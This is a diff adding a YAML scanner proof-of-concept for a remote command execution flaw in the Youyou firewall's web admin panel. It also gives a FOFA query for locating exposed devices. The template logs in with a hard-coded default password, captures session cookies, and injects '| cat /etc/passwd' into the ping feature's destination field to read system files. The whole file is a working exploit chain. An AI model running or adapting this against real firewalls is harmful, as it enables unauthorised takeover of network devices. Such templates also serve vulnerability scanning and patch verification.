@@ -1,0 +1,29 @@
+id: poc-yaml-yy-firewall-rce
+info:
+  name: 佑友防火墙 后台命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 佑友防火墙
+  fofa: title="佑友防火墙"
+requests:
+- method: POST
+  path: /index.php?c=user&a=ajax_save
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: username=admin&password=hicomadmin&language=zh-cn
+  expression: status_code == 200 && contains(body,"{\"success\":true,\"message\":\"\"}")
+  output:
+  - regex_match(headers,"FWSESSID=(?P<fwsessid>[0-9a-z]+)")
+  - regex_match(headers,"PHPSESSID=(?P<phpsessid>[0-9a-z]+)")
+- method: POST
+  path: /index.php?c=maintain&a=ping
+  headers:
+    Cookie: FWSESSID={{.fwsessid}}; PHPSESSID={{.phpsessid}}; lange=zh-cn
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: interface=&destip=127.0.0.1+%7C+cat+%2Fetc%2Fpasswd
+  expression: "status_code == 200\n&& contains(body,\"root:\")\n&& contains(body,\"\
+    /bin\") \n&& contains(title,\"Ping\")\n"
+variables: {}
+transport: http
